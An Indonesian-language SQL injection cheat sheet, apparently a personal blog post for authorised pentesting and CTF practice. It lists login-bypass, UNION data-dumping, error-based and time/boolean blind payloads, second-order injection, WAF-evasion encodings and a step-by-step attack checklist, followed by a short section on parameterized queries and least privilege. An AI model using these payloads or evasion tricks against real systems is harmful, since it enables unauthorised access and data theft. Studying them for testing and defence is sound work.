💉 SQL Injection (SQLi) Cheat Sheet — 2026 Edition
"Dari tahun 1998 sampe 2026, SQL Injection masih jadi jalan tolnya para hacker pemula buat masuk ke database."
Dokumentasi pribadi yang tak kumpulin dari hasil bug hunting, CTF, dan eksplorasi dunia cyber sec selama 2025-2026. Bukan buat iseng ngerusak, tapi buat nge-test sistem yang emang udah dikasih izin (penetration testing legal) dan buat reminder diri sendiri kalo developer tuh sering banget lupa sanitasi.

🧠 SQL Injection — Definisi Ulang di 2026
dulu gw kira sql injection tuh cuma sekedar admi' or '1'='1 buat bypas login ternyata pas dipelajari ada banyak jenis sql injection, seperti:

Eror Based SQLi (klasik): masih yang paling umum, karena tinggal liat response error dari database.
Blind/Time SQLi: gak ada error nongol, tapi kita bisa bedain respon "true" vs "false" dari delay atau perubahan konten.

Intinya: Selama ada query yang nempel dari input user tanpa parameterized query, SQLi bakal selalu ada.

⚠️ Dampak Nyata SQL Injection (Bukan Cuma Teori)
G2 kasih gambaran konsekuensi yang udah terjadi di dunia nyata, biar gw/kalian makin paham kenapa ini high risk banget:

Dampak	Contoh Kasus Nyata:
Bypass autentikasi	Masuk dashboard admin tanpa password cuma modal ' OR 1=1 -- (klasik)
Data breach massal	Biasanya bocor cuma gara gara sqli
Data manipulation	Nge-update saldo, ngapus log aktivitas, atau ngubah status pesanan, kenapa bisa? ya karna sqli hubungannya ama database.
RCE (Remote Code Execution)	Di kasus tertentu (misal SQL Server dengan xp_cmdshell), attacker bisa eksekusi perintah sistem operasi langsung

🔍 Teknik SQL Injection Paling "Nendang" — Yang Sering Gue Pake
Nih gue kumpulin payload-payload yang paling hits di tahun 2026, berdasarkan pengalaman gue pentest dan riset dari forum-forum underground (yang etis tentunya).

1. Klasik Abadi — Login Bypass (Tanpa Password)
Ini yang paling sering dicoba duluan, soalnya kalo berhasil, lo udah dapet akses admin cuma dalam 5 detik.

sql
Input: ' OR '1'='1' -- -
Query: SELECT * FROM users WHERE username = '' OR '1'='1' -- - AND password = ''

-- Penjelasan:
-- Kondisi '1'='1' SELALU TRUE, jadi query balikin semua baris.
-- Tanda -- (double dash) di SQL itu artinya komen, jadi sisa query (password) diabaikan.
Varian lain yang gak kalah sakti:

sql
' OR 1=1 -- 
' OR 'x'='x
admin' -- 
admin' OR 1=1 -- 
' UNION SELECT NULL, 'admin', '12345' -- 
Tips 2026: Sekarang banyak WAF (Web Application Firewall) yang udah pinter nge-detect OR 1=1. Makanya lo bisa pake encoding atau case manipulation:

sql
' OR 1=1 --  →  %27%20OR%201%3D1%20--%20
' Or 1=1 --  →  huruf O besar kecil biar luput dari regex
2. Union-Based SQLi (Ngambil Data Dari Tabel Lain)
Kalo lo udah tau jumlah kolom di tabel asli, lo bisa pake UNION buat nyomot data dari tabel lain (misal tabel users).

Langkah pertama: cari tau jumlah kolom

sql
' ORDER BY 1 -- 
' ORDER BY 2 -- 
' ORDER BY 3 -- 
-- Sampe muncul error, berarti jumlah kolom = (angka sebelum error)

-- Atau pake UNION SELECT:
' UNION SELECT NULL -- 
' UNION SELECT NULL,NULL -- 
' UNION SELECT NULL,NULL,NULL -- 
Kalo udah tau jumlah kolom (misal 3):

sql
' UNION SELECT id, username, password FROM users -- 
' UNION SELECT null, name, pass FROM admin -- 
Di 2026, Union-based masih jadi andalan karena response-nya langsung kelihatan di halaman web. Tinggal cocokin posisi kolom yang ditampilin.

3. Error-Based SQLi (Biarkan Database Ngoceh)
Ini favorit gue soalnya database-nya cerita sendiri, ngasih tau struktur tabel, bahkan sampe nama kolom.

sql
' AND 1=CONVERT(int, @@version) --  (buat SQL Server)
' AND extractvalue(1, concat(0x7e, database())) --  (buat MySQL)
' AND updatexml(1, concat(0x7e, version()), 1) -- 
Output yang diharapkan: Error nampilin nama database, versi, atau path folder. Dari situ lo udah bisa petakan infrastruktur mereka.

4. Blind SQLi — Si Pendiam Tapi Mematikan
Ini lebih challenging soalnya gak ada error yang keluar. Lo harus bedain respon "halaman normal" vs "halaman kosong" atau "delay waktu".

Time-Based Blind (pake delay):

sql
' AND SLEEP(5) --  (MySQL)
' WAITFOR DELAY '0:0:5' --  (SQL Server)
' AND pg_sleep(5) --  (PostgreSQL)
Kalo halaman loading 5 detik, berarti query lo dieksekusi. Itu artinya SQLi-nya ada.

Boolean-Based Blind (pake true/false):

sql
' AND 1=1 --   → halaman normal (true)
' AND 1=2 --   → halaman beda/kosong (false)
Dari situ lo bisa bruteforce huruf per huruf pake substr:

sql
' AND SUBSTRING(database(),1,1) = 'a' -- 
5. Second-Order SQLi (Yang Paling Licik)
Ini jarang dibahas, tapi sering gue temuin di aplikasi enterprise.

Caranya: lo masukin payload di form registrasi (misal nama: admin' --). Itu disimpen di database dalem keadaan aman. Tapi pas data itu dipake lagi di fitur lain (misal di halaman profil atau laporan), query baru nge-execute payload lo.

Makanya di 2026, Second-Order SQLi naik daun soalnya WAF cuma scan input pertama doang, gak nge-scan data dari database.

🛡️ 5 Teknik Anti-WAF yang Wajib Lo Tahu (2026)
Banyak yang udah pake WAF kayak Cloudflare, AWS WAF, atau Imperva. Tapi tenang, masih ada celah:

Teknik	Contoh Payload
Case Switching	' oR 1=1 --
URL Encoding	%27%20%4F%52%20%31%3D%31%20--
Double Encoding	%2527%2520%254F%2552...
Inline Comments	' /**/OR/**/1=1 --
Null Byte (%00)	%00' OR 1=1 -- (buat nyelipin filter string)
Tambahan 2026: Sekarang banyak WAF yang pake machine learning, jadi lo harus pake payload random generator dan fuzzing biar gak kena pola.

🧪 Checklist SQL Injection buat Lo yang Mau Pentest
Gue biasa pake checklist ini kalo lagi ngetes aplikasi:

Cek semua input field (form login, search bar, filter, URL parameter, header, cookie)

Coba input kutip tunggal ' atau kutip ganda " dan liat respon error

Kalo error muncul, catat jenis databasenya (MySQL, PostgreSQL, MSSQL, Oracle)

Coba payload OR 1=1 buat bypass login

Cek jumlah kolom pake ORDER BY atau UNION SELECT NULL

Kalo union berhasil, dump data dari information_schema.tables

Kalo gak ada output, cobain time-based delay

Cobain juga second-order injection di data yang udah tersimpan

🔐 Cara Aman (Buat Developer)
Buat lo yang juga ngerjain projek ngoding, jangan cuma ngandelin WAF doang. Ini 3 pilar utama yang gue terapin:

Parameterized Query / Prepared Statements (wajib!)
Ini yang paling ampuh, jadi query dan data dipisah.

python
# Contoh Python (Pake parameterized query)
cursor.execute("SELECT * FROM users WHERE username = %s AND password = %s", (user, pass))
Stored Procedure — kalo bisa pake ini buat nambah lapisan.

Least Privilege Principle — user database jangan dikasih akses admin, cukup baca/tulis sesuai kebutuhan.

🌐 Sumber Belajar & Referensi (Gw make ini)
PortSwigger Web Security Academy — lab SQLi gratis, komplit banget ( minus bahasa inggris )
PayloadsAllTheThings (GitHub) — kumpulan payload dari berbagai macam injeksi
OWASP SQL Injection Prevention Cheat Sheet

✍️ Pesan & Catatan
Di 2026, SQL Injection tetep jadi masalah utama di dunia web. Kenapa? Karena banyak web app dari startup, web pemerintah, sekolah2 atau institusi pendidikan, yang dibangun dari tahun 2000an (kode warisan) dimana merekta takut melakukan perubahan kode ke yang lebih aman cuma karna takut eror, padahal sqli ini masalah yang bener bener real.

Jadi buat gw/kalian yang mau jadi security researcher: jangan pernah berenti belajar SQLi. Tekniknya emang udah tua, tapi sampe sekarang masih banyak yang kena. Buktinya, hampir tiap bulan ada aja berita bocor data gara-gara query yang gak di-prepare.

"Dokumentasi ini cuma buat pembelajaran dan pengujian sistem yang sudah punya izin tertulis. Penyalahgunaan di luar ranah etis adalah tanggung jawab masing-masing."


